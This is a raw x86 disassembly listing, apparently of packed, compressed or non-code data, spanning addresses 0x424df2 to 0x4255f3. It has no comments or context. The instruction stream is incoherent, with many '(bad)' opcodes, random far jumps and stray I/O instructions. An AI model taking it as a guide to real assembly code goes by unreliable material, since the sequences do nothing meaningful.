  424df2:	add    bh,BYTE PTR [ebx+0x52c53d75]
  424df8:	sbb    edi,DWORD PTR [esi+0x7ad42f58]
  424dfe:	aad    0xac
  424e00:	dec    ch
  424e02:	adc    esi,DWORD PTR [ecx-0x6a953aa5]
  424e08:	xor    DWORD PTR [ebp-0x67831124],edx
  424e0e:	fdivrp st(1),st
  424e10:	jmp    0x4e7c:0x83d12ca8
  424e17:	nop
  424e18:	ret    0xaea9
  424e1b:	push   ebp
  424e1c:	arpl   WORD PTR [ebp+0x20],bx
  424e1f:	jb     0x424dc6
  424e21:	mov    bh,0x56
  424e23:	or     ebp,DWORD PTR [edi+ecx*8-0x1a0ffa51]
  424e2a:	sub    dl,al
  424e2c:	aas    
  424e2d:	sbb    al,0x93
  424e2f:	test   BYTE PTR [ebx-0x6e],0x6f
  424e33:	dec    edi
  424e34:	enter  0x86d3,0x29
  424e38:	or     esi,DWORD PTR [ecx-0x44]
  424e3b:	hlt    
  424e3c:	push   edi
  424e3d:	jbe    0x424e14
  424e3f:	xor    BYTE PTR [edx],ch
  424e41:	nop
  424e42:	mov    ch,BYTE PTR [edx]
  424e44:	lods   al,BYTE PTR ds:[esi]
  424e45:	add    al,0xd5
  424e47:	lea    eax,[esi-0x515c03dc]
  424e4d:	(bad)  
  424e4f:	int3   
  424e50:	dec    ecx
  424e51:	iret   
  424e52:	(bad)  
  424e53:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  424e55:	adc    DWORD PTR [ebx-0x50a717d],0x2d
  424e5c:	outs   dx,BYTE PTR gs:[esi]
  424e5e:	dec    edx
  424e5f:	push   ds
  424e60:	and    edi,DWORD PTR [edx-0x2e]
  424e63:	jbe    0x424dfe
  424e65:	inc    ebp
  424e66:	xchg   BYTE PTR [ebx+0xf],bl
  424e69:	cwde   
  424e6a:	int    0x65
  424e6c:	sub    bh,ah
  424e6e:	jl     0x424df3
  424e70:	add    al,0x60
  424e72:	dec    edi
  424e73:	ins    BYTE PTR es:[edi],dx
  424e74:	retf   0xbfee
  424e77:	rcr    DWORD PTR [esi+esi*1-0x5d32780f],0x1f
  424e7f:	pusha  
  424e80:	cdq    
  424e81:	add    dl,ch
  424e83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424e84:	xchg   ebp,eax
  424e85:	mov    esi,0xe5513e06
  424e8a:	nop
  424e8b:	inc    eax
  424e8c:	inc    DWORD PTR [eiz*1+0x7176d04d]
  424e93:	stos   DWORD PTR es:[edi],eax
  424e94:	dec    ecx
  424e95:	inc    edi
  424e96:	inc    eax
  424e97:	jae    0x424ee5
  424e99:	and    eax,0x7a33dea9
  424e9e:	xchg   esi,eax
  424e9f:	lock cmp al,0xd
  424ea2:	mov    DWORD PTR [ecx-0x24c1c7ea],eax
  424ea8:	jp     0x424e98
  424eaa:	sub    al,0x4f
  424eac:	xor    al,0x10
  424eae:	xor    eax,DWORD PTR [edi-0x7b]
  424eb1:	inc    edi
  424eb2:	dec    ebp
  424eb3:	or     bh,BYTE PTR [eax-0x32776caf]
  424eb9:	mov    esp,0x9569be74
  424ebe:	pop    ds
  424ebf:	leave  
  424ec0:	sar    BYTE PTR [ebx-0x60],cl
  424ec3:	aam    0xdd
  424ec5:	imul   eax,DWORD PTR [edx],0x3d
  424ec8:	test   eax,0x42ad3498
  424ecd:	aad    0xd1
  424ecf:	adc    eax,0x23873d5
  424ed4:	int3   
  424ed5:	add    eax,0xa66a7215
  424eda:	clc    
  424edb:	sub    BYTE PTR [edi+0x5bfe49c0],dl
  424ee1:	sub    DWORD PTR [edi],edi
  424ee3:	push   cs
  424ee4:	pop    edx
  424ee5:	or     bh,BYTE PTR [ebx+0x4d2ef867]
  424eeb:	jge    0x424f69
  424eed:	pop    edi
  424eee:	xchg   edx,eax
  424eef:	loopne 0x424ee8
  424ef1:	push   cs
  424ef2:	(bad)  
  424ef3:	xchg   DWORD PTR es:[esi],edi
  424ef6:	adc    edx,DWORD PTR [ecx]
  424ef8:	iret   
  424ef9:	dec    edi
  424efa:	jecxz  0x424f2b
  424efc:	sbb    al,0xd5
  424efe:	in     eax,dx
  424eff:	sar    DWORD PTR [esi+0x4e],0x5f
  424f03:	les    edx,FWORD PTR [ebp+esi*4-0x5abc796b]
  424f0a:	jp     0x424ecb
  424f0c:	mov    bh,0xe
  424f0e:	mov    esi,0x704ffb02
  424f13:	popf   
  424f14:	stc    
  424f15:	add    BYTE PTR [ecx-0x4ac423ef],dh
  424f1b:	cmp    dl,ch
  424f1d:	call   DWORD PTR [ebp+0x3]
  424f20:	jg     0x424eb9
  424f22:	dec    esi
  424f23:	push   0x2a832c51
  424f28:	xlat   BYTE PTR ds:[ebx]
  424f29:	cmp    edi,edx
  424f2b:	adc    dh,BYTE PTR [eax]
  424f2d:	js     0x424f26
  424f2f:	inc    edi
  424f30:	adc    BYTE PTR [eax],bl
  424f32:	and    BYTE PTR gs:[ecx+0x4e],0x68
  424f37:	pop    ebx
  424f38:	ins    BYTE PTR es:[edi],dx
  424f39:	ds jge 0x424efa
  424f3c:	mov    dl,0xa9
  424f3e:	push   edi
  424f3f:	fcom   DWORD PTR [edi+0x79]
  424f42:	je     0x424f73
  424f44:	imul   BYTE PTR [si+0x4c]
  424f48:	clc    
  424f49:	jbe    0x424f7c
  424f4b:	add    DWORD PTR [esi],0xfffffffe
  424f4e:	dec    ebp
  424f4f:	icebp  
  424f50:	arpl   bp,cx
  424f52:	cld    
  424f53:	scas   al,BYTE PTR es:[edi]
  424f54:	clc    
  424f55:	fimul  DWORD PTR [ebx]
  424f57:	xchg   edi,eax
  424f58:	fld    TBYTE PTR [eax]
  424f5a:	and    DWORD PTR [ebx],edi
  424f5c:	xor    ebx,DWORD PTR [eax+0x4]
  424f5f:	fldcw  WORD PTR [edx]
  424f61:	xor    dh,BYTE PTR [edx+esi*8+0x5c]
  424f65:	pop    ebx
  424f66:	fsubr  QWORD PTR [ebp+0x79]
  424f69:	out    dx,eax
  424f6a:	sub    eax,0xe9705c2
  424f6f:	icebp  
  424f70:	mov    ebx,0xad15c811
  424f75:	test   edx,edi
  424f77:	mov    ds:0xfc319b4b,al
  424f7c:	clc    
  424f7d:	or     ecx,DWORD PTR [edi]
  424f7f:	js     0x424f04
  424f81:	ret    
  424f82:	xor    BYTE PTR [ebx],ch
  424f84:	pop    ebp
  424f85:	mulps  xmm5,XMMWORD PTR ds:0x1d78929a
  424f8c:	inc    edi
  424f8d:	xor    bl,0x2a
  424f90:	loope  0x424fa4
  424f92:	or     ecx,DWORD PTR [edx-0x5b]
  424f95:	cmp    DWORD PTR [eax],esp
  424f97:	rcr    DWORD PTR [ebx-0x409f0770],1
  424f9d:	inc    esi
  424f9e:	or     ch,0x4d
  424fa1:	or     al,0x82
  424fa3:	mov    edx,0x51217afd
  424fa8:	jmp    0xc014:0x19df8ab
  424faf:	xor    cl,BYTE PTR [esi-0x304e4c60]
  424fb5:	test   edx,0xcbb5da87
  424fbb:	push   ss
  424fbc:	mov    bl,0xeb
  424fbe:	inc    edi
  424fbf:	mov    ds,edi
  424fc1:	(bad)  
  424fc2:	xor    eax,0xb1d2c724
  424fc7:	in     al,0x24
  424fc9:	and    bl,al
  424fcb:	mov    DWORD PTR [eax+eiz*8-0x2899dcf2],esi
  424fd2:	dec    edi
  424fd3:	and    eax,0x31b8b1d0
  424fd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424fd9:	sbb    eax,DWORD PTR [edx-0x3c]
  424fdc:	out    0x4a,al
  424fde:	loope  0x424fcd
  424fe0:	pop    ss
  424fe1:	out    0x96,eax
  424fe3:	add    BYTE PTR [eax],ah
  424fe5:	mov    dl,ch
  424fe7:	or     al,0xa0
  424fe9:	or     eax,0x5a951162
  424fee:	mov    eax,ds:0x64287ba2
  424ff3:	pop    es
  424ff4:	add    eax,0x94af7fa0
  424ff9:	arpl   WORD PTR [eax],si
  424ffb:	sahf   
  424ffc:	inc    eax
  424ffd:	mov    edi,0xb9a6d367
  425002:	in     al,dx
  425003:	shl    BYTE PTR [edi+0x40],1
  425006:	adc    al,0x9a
  425008:	xor    al,0x83
  42500a:	les    ebp,FWORD PTR [ebp+0x58]
  42500d:	ds ds ja 0x424fa7
  425011:	push   eax
  425012:	jnp    0x424fc3
  425014:	fidivr DWORD PTR [esi]
  425016:	ins    BYTE PTR es:[edi],dx
  425017:	fwait
  425018:	repnz test al,0xd
  42501b:	pusha  
  42501c:	push   0x94b3d303
  425021:	xchg   BYTE PTR [eax+0x7a],al
  425024:	inc    edx
  425025:	jecxz  0x425098
  425027:	aam    0x83
  425029:	adc    BYTE PTR [ecx+0x58f1a1b2],bh
  42502f:	mov    bh,0x1a
  425031:	dec    eax
  425032:	leave  
  425033:	jmp    ebp
  425035:	push   esi
  425036:	rcr    ch,0x48
  425039:	sti    
  42503a:	pop    edx
  42503b:	adc    eax,0x2ea97527
  425040:	xor    ch,BYTE PTR [edx-0x29]
  425043:	xor    ebx,DWORD PTR [ebp+esi*8+0x4454947a]
  42504a:	imul   edi,DWORD PTR [edi+ebx*1+0x46],0xf9245096
  425052:	jne    0x425078
  425054:	cld    
  425055:	or     BYTE PTR [ebp+0x2b],0x10
  425059:	pop    ebp
  42505a:	ds jmp 0x424fec
  42505d:	or     DWORD PTR [esi-0x29],0x5f
  425061:	rol    BYTE PTR [edi+0x7398dc9c],1
  425067:	fsubr  st,st(2)
  425069:	push   edx
  42506a:	or     al,0x37
  42506c:	mov    ch,0x72
  42506e:	std    
  42506f:	out    0xb8,eax
  425071:	jmp    0x425012
  425073:	xchg   edx,eax
  425074:	stc    
  425075:	ds or  eax,0x79ccdf9e
  42507b:	in     al,dx
  42507c:	dec    esp
  42507d:	add    eax,0x7b442e65
  425082:	call   0x8dea:0xd52c9ecb
  425089:	lds    ebx,FWORD PTR [ecx+eiz*1]
  42508c:	pop    ebx
  42508d:	ffreep st(2)
  42508f:	inc    eax
  425090:	sti    
  425091:	mov    al,BYTE PTR ds:0x5445de66
  425097:	dec    ebx
  425098:	mov    bl,BYTE PTR [ebp-0x41]
  42509b:	popf   
  42509c:	sbb    ecx,DWORD PTR [ebx+0x298f58f5]
  4250a2:	add    al,0x92
  4250a4:	inc    ebx
  4250a5:	lods   eax,DWORD PTR ds:[esi]
  4250a6:	sbb    edx,eax
  4250a8:	(bad)  
  4250a9:	sbb    bl,BYTE PTR [ecx-0x35ba756f]
  4250af:	retf   0x8f54
  4250b2:	push   ebx
  4250b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4250b4:	mov    eax,0x3b8860
  4250b9:	mov    ebx,0xcc87d795
  4250be:	not    DWORD PTR [ebp-0x41]
  4250c1:	sti    
  4250c2:	and    al,0x24
  4250c4:	es sbb dl,ah
  4250c7:	pop    edi
  4250c8:	jbe    0x4250ec
  4250ca:	into   
  4250cb:	enter  0xcb88,0xff
  4250cf:	and    esi,eax
  4250d1:	xor    BYTE PTR [ebp+0x26],ah
  4250d4:	inc    edi
  4250d5:	enter  0x5963,0x33
  4250d9:	mov    bh,0x6f
  4250db:	je     0x425078
  4250dd:	pusha  
  4250de:	mov    dh,0xaa
  4250e0:	out    dx,al
  4250e1:	repz mov ds:0x90096eea,al
  4250e7:	inc    esi
  4250e8:	xlat   BYTE PTR ds:[ebx]
  4250e9:	ja     0x425135
  4250eb:	cdq    
  4250ec:	rcl    edx,cl
  4250ee:	fnsetpm(287 only) 
  4250f0:	mov    edx,0xfe76e9fd
  4250f5:	xor    eax,0xb7538cdf
  4250fa:	or     edx,DWORD PTR [eax+0x17]
  4250fd:	gs mov dx,0x41e4
  425102:	fcmovne st,st(6)
  425104:	cdq    
  425105:	push   ds
  425106:	mov    ss,WORD PTR [ecx-0x19e7fb41]
  42510c:	or     BYTE PTR [esi+0x1],ah
  42510f:	pop    eax
  425110:	xor    al,0xf0
  425112:	das    
  425113:	cmp    ch,BYTE PTR [edx-0x1d]
  425116:	mov    esi,0x7c807834
  42511b:	mov    dl,BYTE PTR [esp+ebx*1-0x7a157998]
  425122:	(bad)  
  425123:	fs jp  0x4251a4
  425126:	and    ch,BYTE PTR [ebx+eiz*1+0x1a834648]
  42512d:	test   BYTE PTR [edi],0xc2
  425130:	scas   al,BYTE PTR es:[edi]
  425131:	mov    ?,esp
  425133:	or     al,0x56
  425135:	push   ebx
  425136:	pop    edi
  425137:	jo     0x4250ed
  425139:	xor    al,0xc0
  42513b:	rcl    ecx,0x51
  42513e:	ins    BYTE PTR es:[edi],dx
  42513f:	jmp    FWORD PTR [edx+0xa]
  425142:	pop    esp
  425143:	popa   
  425144:	stos   DWORD PTR es:[edi],eax
  425145:	push   cs
  425146:	mov    eax,ds:0xc61a34a7
  42514b:	cwde   
  42514c:	mul    bh
  42514e:	leave  
  42514f:	nop
  425150:	cmp    al,0x30
  425152:	(bad)  
  425154:	sar    BYTE PTR [eax-0x3441e614],cl
  42515a:	fcomp  DWORD PTR [ebx-0x52]
  42515d:	mov    bl,0x6e
  42515f:	jbe    0x4250ef
  425161:	mov    edx,0x5fd8233e
  425166:	imul   esp,DWORD PTR [ebx-0x147c21a1],0x41
  42516d:	pop    ss
  42516e:	out    0xfa,eax
  425170:	cmp    BYTE PTR [esi],cl
  425172:	pop    edi
  425173:	outs   dx,BYTE PTR ds:[esi]
  425174:	inc    ebx
  425175:	sbb    eax,0xa3e0bc02
  42517a:	gs bswap ecx
  42517d:	push   0x1b7e4106
  425182:	sbb    DWORD PTR [esi+edi*1],edx
  425185:	retf   0xd107
  425188:	jno    0x42516b
  42518a:	mov    al,0x73
  42518c:	out    dx,eax
  42518d:	mov    ds:0x3548ec99,eax
  425192:	push   edi
  425193:	out    0x0,al
	...
  4251a1:	imul   edi,DWORD PTR [esi-0x480049c5],0x4a7bffed
  4251ab:	dec    ecx
  4251ac:	pop    ecx
  4251ad:	or     BYTE PTR [edx+0x6a],ch
  4251b0:	lahf   
  4251b1:	retf   0x1c8
  4251b4:	add    BYTE PTR [ebx+0x13000003],ch
  4251ba:	mov    esi,edi
  4251bc:	pop    ebx
  4251bd:	xor    DWORD PTR [esi],ecx
  4251bf:	fdivp  st(7),st
  4251c1:	enter  0x8bab,0x1d
  4251c5:	sti    
  4251c6:	sub    BYTE PTR [ecx+eiz*1+0x150fc59e],ch
  4251cd:	add    BYTE PTR [ebp+0xc3d3b1b],bh
  4251d3:	fisttp WORD PTR [esi-0x3783325d]
  4251d9:	fdivr  QWORD PTR [ebx]
  4251db:	push   esi
  4251dc:	aas    
  4251dd:	mov    esi,0xf0cd7f96
  4251e2:	inc    esi
  4251e3:	mov    dh,0x2d
  4251e5:	in     eax,dx
  4251e6:	clc    
  4251e7:	inc    edx
  4251e8:	jecxz  0x425230
  4251ea:	jl     0x42526b
  4251ec:	mov    al,0xe8
  4251ee:	jbe    0x425262
  4251f0:	hlt    
  4251f1:	in     al,dx
  4251f2:	and    BYTE PTR [esi-0x72],dl
  4251f5:	sub    ah,BYTE PTR [ebx]
  4251f7:	add    esp,eax
  4251f9:	sahf   
  4251fa:	push   ebp
  4251fb:	fcomp  DWORD PTR [edi]
  4251fd:	and    al,0x1e
  4251ff:	jmp    0x3c6e:0xcb2876d3
  425206:	pop    esi
  425207:	adc    al,0x11
  425209:	jmp    0x425268
  42520b:	push   cs
  42520c:	pushf  
  42520d:	pop    edx
  42520e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42520f:	mov    cs,WORD PTR ds:0x4f15acbe
  425215:	dec    bh
  425217:	rcl    DWORD PTR [edi+eax*1+0x3431b0dd],1
  42521e:	fmul   DWORD PTR [ecx+0x144fa88b]
  425224:	shl    DWORD PTR [ebx-0x40],0x27
  425228:	mov    ebx,0xd651fb85
  42522d:	in     eax,0xc8
  42522f:	mov    WORD PTR [eax+0x37f387bc],gs
  425235:	mov    dh,0xe0
  425237:	stos   BYTE PTR es:[edi],al
  425238:	pop    ebp
  425239:	das    
  42523a:	dec    ecx
  42523b:	inc    edx
  42523c:	pop    esi
  42523d:	mov    cl,BYTE PTR [ebx-0x2ee56231]
  425243:	xchg   esp,eax
  425244:	sti    
  425245:	push   edx
  425246:	inc    eax
  425247:	std    
  425248:	in     eax,dx
  425249:	lock les esi,FWORD PTR [esi]
  42524c:	sbb    bh,BYTE PTR [ebp-0x57fea4aa]
  425252:	scas   al,BYTE PTR es:[edi]
  425253:	sub    dl,ah
  425255:	mov    ?,WORD PTR [esp+edx*2-0x1e]
  425259:	fidiv  DWORD PTR ds:0x5799deab
  42525f:	in     eax,dx
  425260:	aam    0x3c
  425262:	lds    ebp,FWORD PTR [esi]
  425264:	repnz sub edi,0x7
  425268:	jmp    0x4251fe
  42526a:	push   cs
  42526b:	push   ss
  42526c:	mov    ch,0xd0
  42526e:	ds pushf 
  425270:	fcmove st,st(2)
  425272:	sub    eax,0xb9d285cc
  425277:	in     al,dx
  425278:	shl    BYTE PTR [edi],0xaf
  42527b:	jecxz  0x425280
  42527d:	inc    esi
  42527e:	dec    edi
  42527f:	push   cs
  425280:	into   
  425281:	cmp    bh,BYTE PTR [eax+0x47fc73c0]
  425287:	call   0x2427e16e
  42528c:	inc    edx
  42528d:	push   esp
  42528e:	outs   dx,BYTE PTR ds:[esi]
  42528f:	in     eax,0xf7
  425291:	cwde   
  425292:	adc    al,0xf1
  425294:	in     al,0x68
  425296:	scas   eax,DWORD PTR es:[edi]
  425297:	sub    BYTE PTR [eax],bh
  425299:	sbb    BYTE PTR [edx],al
  42529b:	xor    al,BYTE PTR [ecx]
  42529d:	lods   al,BYTE PTR ds:[esi]
  42529e:	imul   ebx,DWORD PTR [edx+0x4c9ef732],0xb
  4252a5:	jle    0x42525f
  4252a7:	gs add edx,edx
  4252aa:	push   ss
  4252ab:	in     al,dx
  4252ac:	mov    ch,0xf3
  4252ae:	sbb    ch,BYTE PTR [ebp-0x1e]
  4252b1:	aad    0xf4
  4252b3:	hlt    
  4252b4:	ins    BYTE PTR es:[edi],dx
  4252b5:	push   ecx
  4252b6:	and    BYTE PTR [esi-0x31228eea],al
  4252bc:	int    0x1a
  4252be:	das    
  4252bf:	jmp    0x425268
  4252c1:	push   0xffffffd1
  4252c3:	popa   
  4252c4:	fchs   
  4252c6:	(bad)  
  4252c8:	sub    al,0x18
  4252ca:	ins    DWORD PTR es:[edi],dx
  4252cb:	jge    0x42532f
  4252cd:	stc    
  4252ce:	dec    ecx
  4252cf:	adc    BYTE PTR [edi+0x1e655323],ch
  4252d5:	sub    eax,DWORD PTR [edi+0x7270e219]
  4252db:	ds cmp eax,0x68d8f875
  4252e1:	xchg   DWORD PTR [eax-0x7],edi
  4252e4:	arpl   WORD PTR [edi+0x72],ax
  4252e7:	fdiv   st,st(1)
  4252e9:	std    
  4252ea:	sub    eax,0x9eb9806b
  4252ef:	and    BYTE PTR [esi-0x76648e89],cl
  4252f5:	add    bl,BYTE PTR [edi-0x5b4812cd]
  4252fb:	xchg   eax,ebx
  4252fd:	popf   
  4252fe:	std    
  4252ff:	fldenv [esi-0x6feea84d]
  425305:	pop    es
  425306:	int    0x59
  425308:	and    eax,0x90d03abb
  42530d:	les    edx,FWORD PTR [ebx-0x64c94ab7]
  425313:	mov    ds:0xa5627ced,eax
  425318:	inc    esp
  425319:	push   esp
  42531a:	pusha  
  42531b:	push   edx
  42531c:	mov    ebp,0xc0224494
  425321:	pop    esi
  425322:	dec    eax
  425323:	mov    al,0xf7
  425325:	jno    0x4252c9
  425327:	pop    ds
  425328:	push   es
  425329:	ffreep st(2)
  42532b:	adc    bl,BYTE PTR [edi-0x43]
  42532e:	mov    ah,0xf9
  425330:	mov    edx,0xeaba1436
  425335:	rol    BYTE PTR [eax+0x4cc7047c],1
  42533b:	(bad)  [ebx-0x7a]
  42533e:	ins    DWORD PTR es:[edi],dx
  42533f:	icebp  
  425340:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425341:	mov    ebx,DWORD PTR ds:0x1447e48e
  425347:	pop    ds
  425348:	mov    dh,0xb1
  42534a:	jmp    0x193a:0x7b9f5c52
  425351:	mov    WORD PTR [eax-0x40],?
  425354:	xchg   ecx,edx
  425356:	test   DWORD PTR [eax-0x32],ebp
  425359:	mov    esp,0xe0c09420
  42535e:	cmp    eax,0xe5214dae
  425363:	loope  0x425312
  425365:	sub    al,0x54
  425367:	rcr    DWORD PTR ds:0x2caebc3e,1
  42536d:	ja     0x4253ad
  42536f:	data16 loop 0x425331
  425372:	sar    BYTE PTR [esi],1
  425374:	xchg   esi,eax
  425375:	cmp    BYTE PTR [edx+ebp*1],bl
  425378:	dec    eax
  425379:	adc    ah,BYTE PTR [esi-0x5b26c0c4]
  42537f:	inc    ebp
  425380:	rep lods al,BYTE PTR ds:[esi]
  425382:	data16 arpl cx,bx
  425385:	mov    dh,0x29
  425387:	fstp   st(6)
  425389:	add    esi,DWORD PTR [eax-0x17bdbd64]
  42538f:	add    eax,DWORD PTR [eax-0x266a7274]
  425395:	cmp    al,0x40
  425397:	mov    fs,edi
  425399:	lods   al,BYTE PTR ds:[esi]
  42539a:	test   esi,ebp
  42539c:	xchg   esi,eax
  42539d:	xor    esi,DWORD PTR [edi+ebx*2-0x40]
  4253a1:	jae    0x42541b
  4253a3:	shl    BYTE PTR ds:0x895b0bf3,cl
  4253a9:	out    dx,al
  4253aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4253ab:	xor    eax,0xf2fa89ea
  4253b0:	adc    cl,0x95
  4253b3:	xor    al,0x59
  4253b5:	pop    esp
  4253b6:	ret    0x57d
  4253b9:	or     al,0x13
  4253bb:	(bad)  
  4253bc:	rol    BYTE PTR [ecx-0x7b],1
  4253bf:	loopne 0x4253d9
  4253c1:	mov    dh,0x83
  4253c3:	mov    bh,0xa3
  4253c5:	mov    WORD PTR [edi-0xdd4438a],si
  4253cc:	xchg   edx,eax
  4253cd:	mov    ds:0x9debbb2b,al
  4253d2:	ins    BYTE PTR es:[edi],dx
  4253d3:	and    edi,0xffffffb0
  4253d6:	pop    es
  4253d7:	mov    ebx,0x44428ec4
  4253dc:	jmp    0xe9cdc80d
  4253e1:	(bad)  
  4253e2:	adc    DWORD PTR [ecx],eax
  4253e4:	push   0xdd16784c
  4253e9:	(bad)  
  4253ea:	repnz inc esp
  4253ec:	pop    ecx
  4253ed:	push   0x36
  4253ef:	inc    esi
  4253f0:	and    edx,esi
  4253f2:	pop    ds
  4253f3:	scas   al,BYTE PTR es:[edi]
  4253f4:	int3   
  4253f5:	(bad)  
  4253f6:	in     al,0xd2
  4253f8:	mov    ds:0x1a31a941,al
  4253fd:	mov    WORD PTR [ebp-0x5bb3713a],fs
  425403:	sahf   
  425404:	jns    0x425406
  425406:	loopne 0x425468
  425408:	cwde   
  425409:	adc    DWORD PTR [edi+esi*4],0x51
  42540d:	mov    ebx,0xb7606904
  425412:	adc    eax,0x93885a21
  425417:	clc    
  425418:	loop   0x425440
  42541a:	lods   eax,DWORD PTR ds:[esi]
  42541b:	les    ecx,FWORD PTR [ebp-0x29]
  42541e:	jno    0x4253a0
  425420:	out    dx,eax
  425421:	(bad)  [ecx]
  425423:	cmp    BYTE PTR [edx+0x3],ah
  425426:	out    0x36,al
  425428:	enter  0x7008,0xdb
  42542c:	aaa    
  42542d:	je     0x4254a9
  42542f:	push   es
  425430:	mov    ebx,0x581639ab
  425435:	mov    bl,0xe8
  425437:	lock (bad) 
  425439:	in     al,dx
  42543a:	mov    ebp,0xa5b20f63
  42543f:	retf   0xa8d2
  425442:	mov    ds:0x800d14ab,eax
  425447:	adc    BYTE PTR [ebx+0x2086e3f],ch
  42544d:	mov    ebp,?
  42544f:	xchg   ecx,eax
  425450:	icebp  
  425451:	jno    0x42542d
  425453:	loope  0x4254a8
  425455:	jl     0x425495
  425457:	(bad)
  42545a:	fisub  WORD PTR [edi+eax*2+0x33]
  42545e:	rol    DWORD PTR [esi-0x67f058d1],0xe4
  425465:	(bad)  
  425467:	int3   
  425468:	lock or eax,0x744341bb
  42546e:	ins    DWORD PTR es:[edi],dx
  42546f:	mov    bh,0xaf
  425471:	inc    ebx
  425472:	mov    ?,edx
  425474:	(bad)  
  425475:	repnz xchg esp,eax
  425477:	adc    dl,BYTE PTR [eax]
  425479:	jg     0x425468
  42547b:	aas    
  42547c:	sbb    esi,DWORD PTR [esi]
  42547e:	pop    edx
  42547f:	push   ds
  425480:	xor    al,0xca
  425482:	mov    ds:0x640b54ec,eax
  425487:	cmp    al,0x46
  425489:	or     ebp,DWORD PTR [edi+edi*2-0x76bf6adf]
  425490:	imul   DWORD PTR [edx+0x52]
  425493:	clc    
  425494:	cmp    DWORD PTR ds:0x345f71e9,esi
  42549a:	mov    al,BYTE PTR [eax+0x76]
  42549d:	mov    cl,0x11
  42549f:	outs   dx,DWORD PTR ds:[esi]
  4254a0:	fadd   QWORD PTR [edi-0x7fe7a7c2]
  4254a6:	push   cs
  4254a7:	xor    esp,DWORD PTR [edi+0x380fee4d]
  4254ad:	cmp    eax,0x76e0b9d3
  4254b2:	arpl   bp,si
  4254b4:	fnstenv [edx-0x7e]
  4254b7:	sbb    DWORD PTR [eax],esi
  4254b9:	clc    
  4254ba:	ds jg  0x425472
  4254bd:	mov    ss,WORD PTR [edi+0x5]
  4254c0:	mov    eax,0xfee26b60
  4254c5:	std    
  4254c6:	shl    BYTE PTR [ecx+0x3b970be8],1
  4254cc:	mov    eax,ds:0xe8abd62b
  4254d1:	aam    0x95
  4254d3:	in     al,0xce
  4254d5:	xor    eax,0xdab2b490
  4254da:	push   ds
  4254db:	inc    esp
  4254dc:	inc    edi
  4254dd:	(bad)  
  4254de:	or     eax,0xd0d88ee1
  4254e3:	inc    edi
  4254e4:	out    0xb0,eax
  4254e6:	mov    gs,WORD PTR ds:[ebp+0x6b8d9e6b]
  4254ed:	fld    QWORD PTR [ebx]
  4254ef:	mov    bl,0xbc
  4254f1:	xchg   edx,eax
  4254f2:	dec    esi
  4254f3:	repnz int3 
  4254f5:	daa    
  4254f6:	scas   eax,DWORD PTR es:[edi]
  4254f7:	retf   0x6b57
  4254fa:	cmp    esi,DWORD PTR [eax-0x63]
  4254fd:	pop    ss
  4254fe:	not    BYTE PTR [ebp+0x1d]
  425501:	or     BYTE PTR [esi-0x7169f127],al
  425507:	not    BYTE PTR [eax+0x78f28624]
  42550d:	dec    esp
  42550e:	cld    
  42550f:	jae    0x42549f
  425511:	pop    edx
  425512:	mov    eax,ss
  425514:	jne    0x42552e
  425516:	jne    0x425559
  425518:	sbb    DWORD PTR [esi-0x3a],0xffffffd2
  42551c:	sbb    BYTE PTR [ebp+edi*1-0x5b283b3e],dh
  425523:	cmp    dh,BYTE PTR [ecx+0x62]
  425526:	into   
  425527:	sub    BYTE PTR [edi+0x69],dh
  42552a:	or     ebp,DWORD PTR [edx+0x2e]
  42552d:	push   ecx
  42552e:	imul   ebp,DWORD PTR [edi+0x2d],0xb7f07382
  425535:	fcom   DWORD PTR [ecx-0x3a]
  425538:	retf   
  425539:	pusha  
  42553a:	fstp   TBYTE PTR [esi-0xa1d2ea8]
  425540:	dec    eax
  425541:	mov    cl,0xb1
  425543:	ds jo  0x425596
  425546:	and    ecx,eax
  425548:	xchg   edi,eax
  425549:	jnp    0x4255b7
  42554b:	and    al,0xfc
  42554d:	call   0x9706:0x66591c04
  425554:	int3   
  425555:	jbe    0x425507
  425557:	xor    bl,BYTE PTR ds:[edi+0x3a]
  42555b:	mul    DWORD PTR [ebp+0x7ce38d94]
  425561:	in     eax,0xb0
  425563:	dec    ebx
	...
  425570:	add    bl,ch
  425572:	dec    eax
  425573:	or     al,0xc7
  425575:	scas   eax,DWORD PTR es:[edi]
  425576:	(bad)  
  425577:	jmp    0x4255e5
  425579:	popa   
  42557a:	mov    cl,ch
  42557c:	or     eax,DWORD PTR [edi+0x1b]
  42557f:	sbb    al,0x8a
  425581:	jne    0x42554f
  425583:	add    DWORD PTR [eax],eax
  425585:	stos   DWORD PTR es:[edi],eax
  425586:	add    eax,DWORD PTR [eax]
  425588:	add    BYTE PTR [ebx+0x97523fa],ah
  42558e:	mov    edi,0xc18f6699
  425593:	nop
  425594:	cmp    eax,0x54c355df
  425599:	cmovno ecx,DWORD PTR [edx+0x3322294f]
  4255a0:	ins    DWORD PTR es:[edi],dx
  4255a1:	sbb    DWORD PTR [ebx],ebp
  4255a3:	xor    DWORD PTR [eax+0x6d],esp
  4255a6:	pusha  
  4255a7:	out    0x75,eax
  4255a9:	inc    ebp
  4255aa:	mov    fs,WORD PTR [esi-0x10]
  4255ad:	(bad)  
  4255ae:	addr16 leave 
  4255b0:	mov    edi,0xf3890967
  4255b5:	ss jbe 0x42554e
  4255b8:	das    
  4255b9:	loop   0x425562
  4255bb:	cmp    edi,DWORD PTR [edx]
  4255bd:	or     al,0xcd
  4255bf:	mov    ah,dl
  4255c1:	shl    DWORD PTR [ecx],1
  4255c3:	mov    BYTE PTR [esi],dl
  4255c5:	mov    esp,0xdf1c468a
  4255ca:	push   esi
  4255cb:	xor    al,0xc3
  4255cd:	inc    edi
  4255ce:	sub    eax,DWORD PTR [esp]
  4255d1:	fwait
  4255d2:	cmp    al,0x14
  4255d4:	pop    ebp
  4255d5:	mov    WORD PTR [edx],?
  4255d7:	mov    WORD PTR [eax],fs
  4255d9:	scas   eax,DWORD PTR es:[edi]
  4255da:	in     al,0xd8
  4255dc:	mov    edx,0x5241dba5
  4255e1:	sbb    DWORD PTR [esi],esp
  4255e3:	ja     0x4255de
  4255e5:	cmp    eax,DWORD PTR [esi+0x1a3b97b2]
  4255eb:	stos   DWORD PTR es:[edi],eax
  4255ec:	call   0xe9915bf4
  4255f1:	aas    
  4255f2:	aaa    
  4255f3:	mov    eax,ds:0xeef722b1
